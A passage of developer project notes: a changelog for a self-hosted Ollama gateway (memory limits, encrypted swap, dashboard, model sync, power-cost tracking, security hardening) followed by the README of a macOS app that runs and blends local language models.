- **Second try: OOM-killed, the host survived.** Patrick ran it again, now
  with the cap from the unit. The kernel OOM-killed llama-server at about
  62 GB anon-rss; ollama.service logged `oom-kill` and restarted. Ollama's
  own estimate said "Host 4772 MiB ... no changes needed" and missed a
  **CPU_REPACK 58092 MiB** buffer: llama.cpp repacked nearly the whole model
  into anonymous CPU memory and put little on the GPU.
  - Knobs, from Ollama v0.34.4's `llm/llama_server.go` and llama.cpp's
    `common/arg.cpp`:
    - Ollama passes its environment to llama-server, so `LLAMA_ARG_*`
      variables on ollama.service reach it: `LLAMA_ARG_REPACK=false`
      (`--no-repack`), `LLAMA_ARG_N_GPU_LAYERS=all`,
      `LLAMA_ARG_N_CPU_MOE=N`, `LLAMA_ARG_FIT=off`.
    - Requests only have `use_mmap` (becomes `--load-mode none`) and
      `num_gpu` (becomes `-ngl`).
    - There is no OLLAMA_* variable or request option for repacking.
  - The gateway now counts a `ram` model against system memory alone
    (VRAM ignored) unless `ollama_no_repack` is true. Only then does
    VRAM+RAM count, and mmap stay on (file-backed, evictable). With the
    default, gpt-oss:120b is refused with a clear message.
  - `tools/ram-model-test.sh` (Python in `ram_model_test.py`) measures
    configurations, each under a runtime drop-in cap with an Ollama
    restart:
    - `norepack`: repack off, mmap on, automatic placement;
    - `norepack-moe`: all layers on the GPU but the experts of the first N;
    - `swap`: defaults plus the encrypted swap, if on;
    - optional `gateway`: today's request, expected to OOM.

    It records load, split, buffers, peaks, min free, TTFT and tok/s, then
    restores Ollama.
  - Encrypted swap is opt-in and undoable: `setup.sh --encrypted-swap 32G`
    and `--remove-encrypted-swap` (`tools/encrypted-swap.sh`). It is plain
    dm-crypt over `/swap-ollama1.img` with a random key each boot, via
    `/etc/crypttab` (`/dev/urandom swap,cipher=aes-xts-plain64,size=256`),
    and replaces the plain `/swap.img`.
    - It does not lift Ollama's `MemorySwapMax=0`; only the test's `swap`
      configuration does, and the gateway still refuses a load that swaps.
    - Both choices wait for the numbers.
  - Unverified: systemd-cryptsetup attaching a regular file (it sets up a
    loop device), and the `LLAMA_ARG_*` behaviour on 0.35.x.
  - Suite: 226 tests; the repack rule has two new mutants.
- **`GET /v1/info`** (for the app's servers branch): `{"gpu": {"vendor",
  "name", "vram_bytes"}}` and nothing else. It is signed and for paired
  devices only.
  - `lib/o1gpu.py` detects it once when the gateway starts:
    - amdgpu sysfs for VRAM;
    - the name from `product_name`, then a small (device, revision) table
      (0x73bf rev c0 is the RX 6900 XT, which pci.ids can't separate from
      the 6800/6800 XT), then pci.ids (subsystem name, else the bracketed
      marketing name);
    - otherwise nvidia-smi, otherwise Intel i915/xe sysfs (VRAM only for
      discrete Arc).
  - The request is the third PROTOCOL vector.
  - Also fixed: the ±61 s skew tests could round to 60 s and pass (the
    one-off flake seen earlier); they use 62 now.
- **Sleep** (automatic idle sleep and Wake-on-LAN are on hold):
  - The panel's Sleep button is a fixed action: `ollama1-sleep.service`,
    which runs `ollama1-helper sleep` (no arguments) and is allowed by the
    polkit rule. It has the confirmation Patrick worded; while the mirror
    resyncs, a note says the sync pauses.
  - `o1sleep.busy_reasons()` refuses it while any of these is active:
    `ollama1-pull@*`, `ollama1-models-sync`, `ollama1-update-now`,
    `ollama1-update-ollama`, `apt-daily(-upgrade)`, or setup.sh's lock. The
    panel checks first (409 with the reasons); the helper checks again
    before `systemctl suspend`. A RAID resync is allowed.
  - The power button suspends: `/etc/systemd/logind.conf.d/ollama1.conf`
    has `HandlePowerKey=suspend` and `HandlePowerKeyLongPress=poweroff`.
    Setup reloads logind with `kill -s HUP`, never a restart.
  - `/usr/lib/systemd/system-sleep/ollama1` stamps the sleep and wake
    times, then starts `ollama1-resume-check` without blocking. The check:
    Ollama's `/api/version` and `/api/ps`, and amdgpu's VRAM and busy
    figures. If either fails, Ollama and the tunnel restart and it is
    logged.
  - The dashboard and panel show the last sleep and wake.
  - Untested on the hardware; Patrick tries it by hand.
- **The dashboard, btop-style** (`lib/o1metrics.py`, `lib/o1dashui.py`,
  `lib/o1font.py`, `bin/ollama1-dash`):
  - `o1metrics.Sampler` ticks once a second. It reads straight from
    `/proc` (stat per core, meminfo, diskstats whole disks only), `/sys`
    (amdgpu and hwmon, sclk and mclk, k10temp Tctl, br0 counters, Ollama's
    cgroup `memory.current`/`max`) and the gateway's counts-only
    `stats.json`. It keeps an hour at 1 s. Slow things run every 10-60 s:
    the tunnel `/ready`, and cloudflared `/metrics` for
    `quic_client_smoothed_rtt`.
  - The gateway adds, still counts only: errors by code, the last 30 model
    events (`load` / `unload[: device switch | make room]` /
    `refused: gpu_fit|gpu_spill|ram_pressure|ram_oom`, name and time), mean
    TTFT over the last 20 streams, and prompt tokens/s.
  - `o1dashui.render(state, w, h, glyphs, range, page)` is pure and returns
    a Canvas, so tests render it at any size.
    - Charts are 2x4 braille dots per cell, or eighth blocks, or
      ` .:-=+*#`; bars use eighth blocks.
    - Layout: 3 columns at 180x44 and up, 2 pages from 100x28, 3 pages
      below that.
    - The pairing code fills the screen, up to 6x wide and 2x tall.
    - The renderer holds no key that could carry content (tested: no
      "prompt", "messages", "content", "response" or "recent").
  - Console font: `ExecStartPre=-+ollama1-dash --set-font /dev/tty1`.
    - It parses the PSF1/PSF2 fonts in `/usr/share/consolefonts` (unicode
      tables), keeps those with ASCII plus blocks and box lines (braille
      preferred), and picks the size closest to 220 columns for the
      framebuffer's pixels.
    - It runs `setfont -C` and records the glyph mode in
      `/run/ollama1/dash-font.json`; with nothing suitable, it falls back
      to ASCII.
    - Which fonts Ubuntu's console-setup ships with braille is unknown: the
      picker adapts.
  - Render cost on the Mac: about 1-2 ms for 240x67.
- **Model library sync** (`sudo ollama1-models sync|status|add NAME [ram]|remove NAME`,
  and the panel's **Update model library**): makes the installed models
  match the allow-list.
  - The preview lists Remove / Download / Update with sizes (only layers
    not on disk yet), the total, the space freed and the disk free after.
    A typed `yes` does exactly that plan: removals first, then pulls with a
    bar per model and one overall ("about N min left" from a smoothed
    rate), 3 tries each, then a summary.
  - **Removal only ever touches installed models that are not on the
    list**; each is re-checked against the list just before its delete. A
    randomized test (60 libraries and lists, with `:latest`, bad lines and
    `ram` flags) proves nothing listed is ever deleted and the deletes equal
    the preview. Ollama cloud entries are left alone.
  - Updates without downloading: the registry manifest's sha256 is compared
    with the installed digest. Ollama writes the pulled manifest byte for
    byte and lists its sha256 as the digest (checked in the v0.34.4
    source). A model the registry can't confirm is shown with `?`, never
    removed.
  - The panel runs two fixed units (polkit updated):
    `ollama1-models-preview.service` writes the preview, and
    `ollama1-models-sync.service` recomputes it and proceeds only if it is
    the same plan the panel showed (fresh, confirmed with its id). Otherwise
    it refuses and shows the new preview. Progress goes to
    `/run/ollama1/library/sync.json`.
  - One sync at a time (a lock), and sleep is refused while one runs, from
    the panel or the CLI.
- **Power and electricity cost** (`ollama1-power.service`, `sudo ollama1-power`,
  the panel's **Power and cost** card, a line on the dashboard).
  - Watts come from a smart plug on the LAN if there is one: Shelly Gen1
    `/status`, Shelly Gen2+ `/rpc/Switch.GetStatus` (digest login), Kasa's
    local protocol, or Tasmota `Status 8`. The plug must have a private IP.
    Redirects aren't followed, the unit may reach only private ranges
    (`IPAddressDeny=any`), and the login sits in `/etc/ollama1/power-plug.json`
    (0600).
  - Otherwise an estimate, always labelled as one: (amdgpu power + RAPL CPU
    package power, wraparound handled, + 40 W) / 90%.
  - Sleep counts 3 W from the sleep/wake stamps. Every other gap is unknown,
    shown as unknown hours and never counted as zero.
  - Energy is stored per minute (Wh, source, seconds measured, tokens) in
    `/var/lib/ollama1/energy/` for 400 days, then as daily totals.
    Intervals are split at minute boundaries.
  - Prices: flat, or time-of-use tiers (on / mid / off / discount) by season
    (date ranges, may wrap the year), with several windows each. A window
    applies on weekdays, weekends, every day or chosen days, and may run past
    midnight, belonging to its start day. The most specific window wins
    (fewer days, then shorter); uncovered time is off-peak. Weekends allow
    only off-peak and discount windows. US federal holidays (plus the day
    after Thanksgiving) are computed with observed dates, and the list is
    editable, with extra dates allowed. Everything is in the schedule's time
    zone with DST: default America/New_York.
  - Each minute is priced at its own tier. The panel shows 1 h / 24 h / 7 d
    / 30 d kWh and cost split by tier, a badge ("on-peak until 21:00"), a
    30-day projection from the per-hour-of-week average, and cost per 1,000
    tokens.
  - The repo's default is a flat rate with no price. The only presets are
    generic weekday on-peak windows (4-9 pm, 2-7 pm, 8 am-8 pm), marked
    "typical, verify against your bill". No utility's schedule or prices
    are in the repo, and a test checks for utility names.
  - The schedule lives in `/var/lib/ollama1-admin/tariff.json` (0600), not
    config.json: the panel runs as o1admin and must be able to save it, and
    it isn't secret. It is edited in the panel (a tab per season, rows of
    windows; saved with CSRF and checked strictly server-side), imported and
    exported as JSON, or set with `sudo ollama1-power set-schedule
    FILE.json`.
- **Review fixes (security and setup safety, after the power commit).**
  - Root never follows a planted symlink or blocks on a FIFO. Files it
    writes get their mode and group through the open file, never by path.
    Files it reads from someone else's folder (the panel's schedule
    request, the pairing spool, the tariff) are opened with `O_NOFOLLOW`,
    checked as regular and bounded in size.
  - The tariff moved to root's `/var/lib/ollama1/tariff.json` (0640, group
    o1view). The panel checks a schedule, leaves it in its own folder and
    starts the fixed `ollama1-power-apply.service`, which reads it safely,
    checks it again and writes root's file.
  - Plugs:
    - only 10/8, 172.16/12, 192.168/16 and fc00::/7 are allowed, with
      `::ffff:` unwrapped and link-local refused, in the validator and the
      unit alike;
    - Shelly Gen1 uses Basic only, and Gen2+ Digest only;
    - each reading has a 3 s overall deadline, even against a plug that
      trickles bytes;
    - replies are shape-checked, and errors are fixed text, never the
      plug's bytes. Any exception falls back to the estimate.
  - The price checker never raises (fuzzed).
  - The power unit dropped `CAP_DAC_OVERRIDE` and `CAP_FOWNER`, and gained
    `SystemCallFilter`, `ProtectProc` and `MemoryMax`. The library units
    are sandboxed.
  - Registry manifests:
    - no redirects;
    - at most 1 MiB;
    - every digest must be `sha256:` plus 64 hex characters, with sizes
      bounded.
  - The utility-name scan uses whole-word matching over more US utilities
    and covers NOTES.md.
  - A model named on ANY allow-list line, parsed or not and in any case,
    is never removed, and nothing is removed while the list has a bad line
    (the preview and the panel show them). This was reproduced: a
    `gpt-oss:120b  RAM` typo would have removed 65 GB.
  - An unreadable disk-free figure now refuses the sync. "Freed" counts
    only blobs no kept model shares.
  - Encrypted swap:
    - it is now an LVM volume (`ubuntu-vg/ollama1swap`), not a file on a
      loop device, and needs that free space in the volume group;
    - crypttab uses `size=512` and `nofail`;
    - a re-run finishes a half-done `on`, and `off` stops if swapoff
      fails;
    - `off` restores `/swap.img` only if `on` commented it out;
    - `on` offers to zero the old `/swap.img`.
  - The RAM test turns SIGHUP and SIGTERM into a clean exit, runs in tmux,
    and setup.sh removes any drop-in it left behind.
  - The RAM test runs only `norepack` and `norepack-moe` by default. `swap`
    runs only with `--configs swap`, and it is refused up front, with the
    reason, unless the encrypted swap is on. On the desktop ubuntu-vg has
    no free space, so for now there's no swap. It is revisited only if both
    no-repack configurations fail.
  - `setup.sh --vg-reserve SIZE`: when growing `/`, leave that much free in
    ubuntu-vg (for a future `--encrypted-swap`). Default 0, so the current
    behaviour is unchanged; it has no effect once `/` has been grown.
    Step 3 is now `grow_root` in setuplib, tested against a fake LVM: no
    reserve means exactly the old `lvextend` of all free extents; it stops
    on unreadable figures or an unexpected result.
  - Re-review lows:
    - Inhibitors end with their job however it ends. The CLI jobs' holder
      reads a pipe until EOF; setup's watches setup's pid and doesn't
      inherit its lock.
    - A missing or unreadable models.allow is an error that blocks all
      removals. "Freed" is 0 if a kept model's manifest can't be read.
    - The RAM test restores Ollama before printing anything, and `say()`
      survives a closed terminal.
    - The apply unit trusts a panel request only if it is a regular file
      with one link, owned by o1admin. It never deletes or writes anything
      in the panel's folder, and its errors use fixed wording (no input
      echoed).
    - `encrypted-swap.sh off` removes only a volume it made.
    - setup moves the panel's old tariff.json once, through the same checks.
  - Setup, library syncs and pulls, and updates hold a logind inhibitor
    (sleep and the power button).
  - The gateway's RAM budget is capped at MemoryHigh, and logind's HUP
    failing is only a note.
- Tested on the Mac: 354 unit tests (incl. shellcheck, the polkit rule in
  node, the setup disk steps against fake mdadm/blkid/lsblk, the guide's
  file and config references, fake Ollama registry and smart plugs). All
  142 mutants are caught
  (`tests/mutate.py`). On the desktop (as pmiller, no
  sudo): the suite under bash 5.3, `setup.sh --plan`, and (second commit)
  the user-mode trial and the dashboard at 120x40 and 80x25.

  The first commit's desktop run also covered `systemd-analyze verify`.

  Not run for real until Patrick runs setup:
  - the root steps;
  - ttyd on its socket behind the panel, tty1 as a service;
  - cloudflared, and Ollama on ROCm.

---

## Layout

| File | What it is |
|---|---|
| `millenai.py` | The whole app — HTTP backend, model routing, and the UI as one embedded HTML string (~3,400 lines) |
| `build_macos_app.sh` | Wraps `millenai.py` into `ConcordeAI.app` |
| `build_dmg.sh` | Builds the app, then a styled DMG with custom artwork and Finder layout |
| `release.sh` | Bumps version → builds → commits → pushes → publishes a GitHub Release |
| `MillenAI.icns` | App/volume icon |

Not in git (see `.gitignore`): built `.app`, `.dmg`, `__pycache__`, and
`v23-*.sh` — those are unrelated VPN scripts and one contains a private
server address.

## Running it

```bash
python3 millenai.py          # serves on 127.0.0.1:8889, opens a pywebview window
```

Everything user-generated lives outside the bundle, so updates never
clobber it:

- `~/Library/Application Support/MillenAI/venv` — private Python env
- `~/Library/Application Support/MillenAI/memory.v2.json` — long-term memory
- `~/Library/Logs/MillenAI/` — engine + bootstrap logs
- `chats.v2.json` — conversation history (see below); `chats.json` and
  `memory.json` are the pre-6b324 files older builds read (see 6b324)
- `profile.json` — legacy_base, the first-write record, the web view
  clean-up's record

## Releasing

```bash
./release.sh patch     # bug fix        1.0.1 -> 1.0.2
./release.sh minor     # new feature    1.0.1 -> 1.1.0
./release.sh major     # rewrite        1.0.1 -> 2.0.0
./release.sh 1.4.2     # explicit
```

Semantic versioning: **patch** for fixes, **minor** for features, **major**
only for a deliberate rewrite.

`APP_BUILD` is a separate monotonic counter that always increments and is
what the updater actually compares — so the marketing version can move
however you like (even backwards) without breaking updates. The release tag
is `v<build>`; the release *title* is the version.

**`APP_VERSION` and `APP_BUILD` in `millenai.py` are the single source of
truth.** Both build scripts read them at build time — the Info.plist, DMG
volume name, filename, and artwork all derive from them. This exists because
earlier releases shipped with mismatched versions in three different places.

Needs `gh` authenticated (`brew install gh && gh auth login`). Tokens stay in
the Keychain; nothing is stored in the repo.

---

## How it works

### Model catalog
One `CATALOG` list defines all 19 models: label, icon, MLX repo, Ollama tag,
port, RAM need, download size. Everything else derives from it —
`MODEL_ROUTES`, `MLX_REPOS`, `MODEL_MEM_BYTES`, `SUPPORTED`, the sidebar rows.
Adding a model is one line.

Apple silicon prefers MLX (fast Metal); Intel falls back to Ollama for the
same models. A model with no Ollama tag is greyed out as "Apple silicon only".

### Tiers
`Fast` (1 model) → `Thinking` (3, plus a "reason step by step" hint) →
`Pro` (5) → `Power` (everything that fits, under *All models*). Each resolves
at request time against what is actually downloaded *and* fits in current free
RAM, then tops up with any other installed model, strongest first.

Blending is sequential — **only one MLX engine can be resident at a time**,
since each pins its full weights in RAM. Parallel calls thrash.

Excluded from auto-blending: vision models (`LLaVA`) and anything under
2.4 GB (1B-class models produce degenerate output). **Power Mode opts out of
those quality filters** — if a model can run, it takes part.

Memory is the only hard limit, and it scales with the machine: a model must
fit in 1.25× its estimated need *and* stay under 80% of total RAM. Estimates
run low — a "44 GB" 70B was measured at 49.7 GB before being OOM-killed — so
a 70B is refused on a 51 GB Mac but allowed on a 128 GB one.

### Research (the agent)
A fifth mode alongside the tiers. One model does the whole run — it plans the
searches *and* writes the brief — so there is only ever one engine load, which
on MLX is the expensive part. The flow: plan queries → search each → dedupe
sources by URL → write a brief citing them as `[1]`, `[2]` → append a linked
source list. Typical run is ~25s over 12 sources.

**Hermes 3 8B leads the Research picks.** The tier's `count` is 1, so the
first *installed* pick is the agent — order in `picks` is the whole selection
mechanism. Hermes is tuned for instruction-following and structured output,
which is most of what planning queries is, and it shows: asked about "macOS 26
Tahoe" it planned *"macOS 26 Tahoe release date"* and *"Key features of macOS
26 Tahoe"*, keeping the version intact, where Mistral Nemo drifted to "macOS
13.0" on both. Adding it to a tier's picks also adds it to `STARTER_LABELS`,
so a fresh install now pulls 4.6 GB more.

**The user's own question is always the first search query.** A local model's
knowledge stops years before the question often does: asked what changed in
"macOS 26 Tahoe", the planner searched for "macOS Monterey" — a version it
recognised — and researched the wrong operating system from end to end,
confidently and with citations. Searching verbatim first means the planner can
only ever *add* angles, never quietly replace the subject. The prompt also
tells it to copy names and versions exactly, and that an unfamiliar term is
probably newer than it is.

Auto web search is suppressed for this tier so the agent isn't handed
pre-fetched snippets for a query it hasn't planned yet. `search_results()`
keeps its own multi-entry cache — `run_search`'s single slot would evict each
query before the next could use it.

`renderMD` gained markdown links for the source list. Only `http(s)` is
matched, so a model cannot emit a `javascript:` or `data:` href; anything else
stays escaped text. Verified — no anchor, no tag, nothing live.

### Showing the blend
The drafts already existed in `run_council`; they were just thrown away. Each
one is now pushed to the UI as `\0DRAFT:{json}\0` the moment its model
finishes, and rendered as a card above the answer — open while they land, then
collapsed to "*2 of 3 models contributed*" once the merge starts. Models that
produced nothing are listed too, greyed, with the reason; a blend that quietly
ran on one model is worth seeing.

Drafts ride on the assistant message (`{role, content, drafts}`) so a reopened
chat still shows the panel, and `addMsg` takes them as a third argument. They
are deliberately kept **out of `content`** — that string is what goes back to
the model as context, what gets spoken aloud, and what a title is generated
from.

### The merger
Gemma writes the final blended answer, preferring the newest generation
installed: **Gemma 4 12B → Gemma 4 26B → Gemma 2 9B IT**, then the strongest
model that fits. The choice of Gemma was measured, not assumed — same three drafts containing nine distinct facts, merged by each
candidate:

| merger | time | words | facts kept | notes |
|---|---|---|---|---|
| **Gemma 2 9B IT** | 11.9s | 121 | **9/9** | concise, clean |
| Mistral Nemo 12B | 13.8s | 207 | 9/9 | injects markdown headers |
| Llama 3.1 8B | 11.3s | 260 | 9/9 | verbose |
| DeepSeek R1 | 18.3s | 183 | 8/9 | slow, **invented a fact** |

Drafts are capped at the 5 strongest and truncated to ~1,500 chars each —
an unbounded merge prompt overflows small models and triggers repetition
loops.

**Chats live on disk, not in localStorage.** WebKit keys its storage to the
bundle identity, and the app runs as the venv's python3 whether launched
from the .app or from source, so its store is `org.python.python`'s, shared
with every other Python/pywebview app (6b324 found the .app is no exception). Relying on it meant history could vanish on an
update or a launch-method change. The backend owns the chats
(`chats.v2.json` since 6b324, atomic writes); the page keeps no copy in
browser storage at all (6b322), and nothing personal (6b324).

**Tier and single-model are mutually exclusive.** Picking a tier clears any
individual model selection and vice versa, so exactly one row is ever
highlighted. This matters beyond cosmetics: the backend prefers `tier` over
`models`, so leaving a stale tier set made explicit model picks silently
ignored.

**The daily model nudge.** Beyond the one-time announce below, anything
still uninstalled earns a gentle once-a-day card ("More models to try",
20-hour gap so launch times drift freely). Its primary action is
**Browse models…**, deliberately not download-everything — the full missing
set can top 100 GB — and it carries its own permanent "Don't remind me
again" (`remind_models_off` in prefs.json, with `remind_models_ts` as the
clock). At most one card per launch, fresh-model announce wins the slot,
and nothing shows during first-run setup.

**New models announce themselves.** `prefs.json` records which model labels
the user has already been offered. On launch, anything in the catalog that is
neither installed nor previously offered gets a one-time "New models
available" prompt — so shipping a release that adds models surfaces them
instead of leaving them buried in "Add models…". First run records the whole
catalog as seen, so nothing is announced to a brand-new install.

### The opening flourish
`rainbowWipe()` runs on every launch and again when downloads finish — one
function, so the two are always identical. A rainbow band crosses the window
diagonally (1.6s) with a narrow white core just behind it; the wordmark rushes
in from 2.3× scale under 22px of blur and lands at ~0.8s, exactly when the band
crosses the middle, with a bloom flaring behind it. The version tag and
greeting rise in on a 0.34s delay so the screen assembles rather than appears.
Then the existing converge-and-absorb finish plays.

**The wordmark is the solid neon sign again.** The stroke-drawn "cycling
lines" variant lived one release (1.7.7) and was reverted on Patrick's call
— the marching dashes read as ants crawling. Solid fill + halo + paint mask
+ strike, exactly as documented above this entry.

**The warp SHATTERS, then reassembles.** Coherent tile motion read as
"just zooming in" — the explicit anti-goal — so tiles now carry wide speed
desync (zj .82–1.32), lateral scatter proportional to 1−z, and individual
spin. On completion they do not crossfade: z pulls home to 1, spin unwinds,
scatter collapses, and the pieces visibly land back in the grid as the
intact video fades up (sim: depth spread 1.32 → 0.055 within 0.6s of the
answer landing).

The skyline arrives on `loadeddata` (first decodable frame), not
`playing` — a cold cache left ~10s of black — fades in over .8s, and a
dead clip URL rotates to the next clip rather than blacking out the
session. **The warp is made OF the video**: no backdrop → no warp, by
design, which is what "the effect didn't apply" looks like when a query
runs during the buffering window.

Three things to preserve if this is ever retouched:

- **A longer duration does not slow the sweep.** Raising it 1.6s → 2.8s
  changed almost nothing visible: the eased curve plus a ±175vw travel still
  threw the band across the middle of the window in ~0.6s. Measured band
  centre against the wordmark to find it. Linear travel over only the
  distance actually needed (±120vw) is what makes it read as slow.
- **Band width and brightness are coupled.** 132vw at opacity .92 flooded the
  entire window with saturated colour and made the wordmark unreadable.
  112vw at .72 is wider than the original and still leaves the page legible.
- **The paint is timed off the band, not guessed.** Travel is symmetric and
  linear, so the band centre reaches the middle of the window at exactly half
  the duration whatever the width; the wordmark sits slightly right of centre,
  so the reveal is centred on 1.53s (delay 1.28s, duration .5s). Verified:
  at 1.28s the band is at x=528 with the wordmark starting at 611 and paint at
  0; at 1.53s band 761, wordmark centre 782, paint 50%; at 1.78s band 994,
  wordmark ending 953, paint 100%.

- **It must not wait on `/api/setup`.** That call enumerates every model on
  disk and took 2.3s here; gating the flourish on it left the window sitting
  there looking frozen. It now fires on the first `requestAnimationFrame`
  (measured: 22ms) and the setup check runs independently.
- **The fly-in easing is `linear` on purpose.** Deceleration is written into
  the keyframes. Any eased curve is far too front-loaded — the wordmark had
  settled by 0.35s, well before the band reached it, so it read as an
  unrelated event instead of something the sweep delivered.

### The skyline backdrop
One of Apple's classic ATV aerial loops of New York (the H.264 set on
`a1.phobos.apple.com` — the same feed the open-source Aerial screensaver
streams; all six URLs verified live, 87–230 MB each, streamed progressively
and never stored). A different clip every launch, never the same one twice
running (`millen.sky` in localStorage).

The launch wash REVEALS the city out of darkness — one `<video>`, hidden
behind the same travelling diagonal mask that paints the wordmark
(4.2s linear, .3s delay), and the colour stays once painted. There used to
be a greyscale copy underneath that the wash "colourised"; it was cut on
Patrick's call — revealing beats colourising — which also deleted the
dual-video sync machinery and half the decode cost.

Sending a query turns the image INTO the warp — not particles over it, the
picture itself. `buildTiles` grids the visible frame into ~850–1150 tiles
(each sampling the LIVE video every frame); at onset every tile sits at
depth z=1, which reconstructs the picture exactly, then the whole plane
accelerates through the viewer with true perspective (position and scale
both 1/z), tiles recycling behind at staggered depths into an endless
tunnel of the footage. Attack is fast (WARP_UP 1.4s) so a 3s query shows
the full effect; teardown restores the intact video seamlessly because the
canvas and the element are the same frame. Two hard-won rules: the canvas
must sit AFTER #skyline in the DOM (below it, the opaque video hides
everything), and every `let` this block touches at load time must be
declared before `starResize()` runs — the TDZ gotcha killed the whole
script once already. The CORS taint stands: never `getImageData` this
canvas.

**Failure is the old behaviour.** The div starts hidden and is shown only
after BOTH videos fire `playing`; any error hides it again. Offline, blocked,
or slow → the starfield alone, exactly as before the feature. Perf mode never
starts the videos. Note this is the one place the app talks to a third host
(read-only, no user data); the About text's "no cloud" refers to chat.

### The starfield
Idle drift; while a query streams the stars stretch into streaks. The ramp is
a 0–1 progress driven by **real elapsed time** and then eased (smoothstep),
not an exponential approach on the speed itself. Approaching a target by a
fixed fraction per frame spends most of its travel in the first fraction of a
second — it landed as a jump rather than a launch — and it runs at whatever
rate the display happens to refresh at. Now: 3.0s up, 1.8s back to idle,
measured 0.5 → 2.7 → 7.1 → 12.3 → 17.4 → 21.0 → 22 across the three seconds.
`dt` is clamped so a backgrounded tab doesn't resume at full speed. Star
brightness follows the same eased value; switching it on `generating`
flickered at the moment a query started.

### Standing preferences (the persona box)
About panel ▸ "How should MillenAI reply?" — free text the user writes
("be direct, I work in finance"), stored as `persona` in `prefs.json` and
folded into the system prompt on every request, quoted verbatim in the
user's own words with "the current message wins" as the tie-breaker.
Deliberately distinct from memory: memory is *extracted guesses*, this is
*authored instruction*, and the prompt ranks it above remembered facts.
Because it rides `dated_system`, it flows into blends and Research briefs
too, and the Gemma fold-system retry carries it automatically. Capped at
2000 chars both in the UI (`maxlength`) and the backend (slice — the API
can be hit directly). Verified end to end: "Always begin your reply with
ACK, be extremely brief" produced `ACK, blue, typically a light blue…`.

### Memory
Facts about the user are extracted in the background after each message by
whichever model just answered, stored in `memory.v2.json`, and folded into the
system prompt. Best-effort: failures never break a chat. Clear it from the
About panel.

### Voice
**getUserMedia in WKWebView is dead by default, and it fails as a silent
hang, not an error** — measured: the promise neither resolves nor rejects,
so the mic button just did nothing. Three gates stack: (1) media devices are
disabled at the WebKit preferences level until the private
`mediaDevicesEnabled` flag is set via KVC — Safari sets it, embedders must
too; (2) pywebview (6.2.1) never implements
`webView:requestMediaCapturePermissionForOrigin:…` on its UIDelegate, and
WebKit waits forever on the missing decision; (3) macOS TCC, which needs
`NSMicrophoneUsageDescription` in Info.plist (present) and shows the normal
one-time prompt. millenai.py patches (1) and (2) at startup by wrapping
`BrowserView.__init__` and `classAddMethods`-ing a grant onto the delegate —
verified with an instrumented probe window: pref set → delegate invoked with
type 1 (microphone) → grant delivered. Everything is wrapped in try/except so
a future pywebview that fixes this natively (or changes internals) degrades
to voice-unavailable instead of breaking launch.

STT is Whisper large-v3-turbo via MLX (Apple silicon only, ~1.6 GB, fetched
on first mic tap). TTS is the macOS `say` binary — free, no download, works
on Intel. Voice chat mode auto-sends after transcription and reads replies
aloud; a new message or mic tap barges in.

**What is read aloud is not what is on screen.** `_speak()` used to receive
the raw reply, so voice chat spoke three things nobody wants to hear: the
whole chain of thought (with the tag itself pronounced, because the markdown
pass turned `<think>` into the word "<think"), the research brief's `Sources`
bibliography — which roughly doubled the length of every spoken answer — and
inline citations as bare numbers mid-sentence. It now strips think blocks,
cuts everything from a trailing `Sources` heading, drops `[1]` / `[2, 5]`
markers, and tidies the space they leave before punctuation.

### Updates
Polls GitHub Releases once a day. A release counts as newer if its
`published_at` is after this build's timestamp, or its tag carries a higher
build number. Downloading hands off to a helper script that waits for the app
to quit, swaps the bundle, strips quarantine, and relaunches.

---

### Remote access (phone / friends) — no GPU hosting needed
The app already IS a web app: pywebview is just a shell over
`http://127.0.0.1:8889`, every fetch is relative, and the viewport meta is
set. So "hosting" is exposing the Mac's own backend — the models keep
running on the M4 Pro, and no cloud GPU is ever involved. The Mac must be
awake.

**The backend has no auth of its own** — it was built for a same-machine
window. `MILLENAI_KEY` (env) is the opt-in gate: when set, every request
needs the key — `/?key=...` once sets a 30-day cookie, everything else is
403, and the app's own window appends the key automatically. Unset = old
behaviour, byte for byte. Verified: no/wrong key 403, right key 302+cookie,
cookie passes page and API, POST without cookie 403.

Personal use: Tailscale (free) — the port is reachable at the Mac's tailnet
address from the phone; nothing public. Friends: `cloudflared tunnel --url
http://127.0.0.1:8889` gives a free public HTTPS URL — set MILLENAI_KEY
first and share the URL with `?key=` included. Quirks: TTS (`say`) speaks
on the Mac, not the phone; mic input works remotely because tunnels are
HTTPS.

## Gotchas

Things that cost real debugging time. Most are non-obvious and will bite
again if forgotten.

**Gemma rejects the `system` role.** Its chat template errors outright. The
app detects this and retries with the system prompt folded into the first
user turn.

**`duckduckgo_search` is dead.** Renamed to `ddgs`; the old package still
imports fine but returns **zero results silently**. Web search was quietly
broken until this was caught. Use `ddgs`.

**Hugging Face's Xet backend hides progress.** Files only materialise at the
end, so progress bars sit at 0% then jump. `HF_HUB_DISABLE_XET=1` is set at
import to force the classic CDN path (also dodges harsher anonymous rate
limits).

**`config.json` is not a completeness signal.** It lands early in a download.
Completeness requires the safetensors, every shard named in the index, and
zero `*.incomplete` blobs — otherwise models report "ready" at 1% downloaded.

**`atexit` does not run on SIGTERM.** Force-quitting orphaned multi-GB model
servers every time. Signal handlers are installed for TERM/INT/HUP.

**Ollama tag matching must be exact.** Having `llama3.2:latest` does not mean
`llama3.2:3b` will resolve — Ollama 404s. Loose matching made models look
ready when chat would fail.

**GitHub timestamps are UTC.** `time.mktime` reads them as local, making every
release look hours newer than it is — so every install would nag about an
update to the version it is already running. Use `calendar.timegm`.

**launchd `KeepAlive` agents are a trap.** The old autostart agents fought the
Ollama menubar app for port 11434 and respawned instantly when OOM-killed,
producing two permanent crash loops and ~14 GB of pinned RAM that survived
quitting the app. The app manages its own engines now; those agents are
removed.

**1B models write garbage titles.** Observed looping "address address
address…" for 16k characters. Title generation requires a ≥2.4 GB model.

**Few-shot prompts confuse small chat models.** Given completion-style
examples, they echo the examples instead of reading the actual message.
Direct instructions work; few-shot does not.

**A repetition detector cannot see token salad.** When a model melts down it
does not always loop — under memory pressure Gemma 4 emitted fragments fused
with hyphens and single characters from nine scripts
(`own-and-and ζ,탕s-तिर-der`). Every "word" there is unique, so the
unique-word ratio read **0.79**, indistinguishable from good prose, and the
guard waved it through. `_looks_degenerate()` now also tests for words
carrying 2+ hyphens (>25% of the text) and for characters from 3+ non-Latin
scripts appearing in runs averaging under 4 characters. That last condition is
what separates salad from a legitimately multilingual answer: real answers
write whole words in each script, salad glues one or two characters onto Latin
fragments.

**The merge was never checked.** Drafts were, the merge wasn't — so a merger
that collapsed streamed its collapse straight to the reader. The merge is now
watched as it arrives; on collapse it emits a `\0RESET\0` sentinel, which
tells the UI to discard everything shown so far, and falls back to the
strongest draft (already checked). Verified end to end: 1,155 characters of
salad streamed, 121 characters of clean answer displayed.

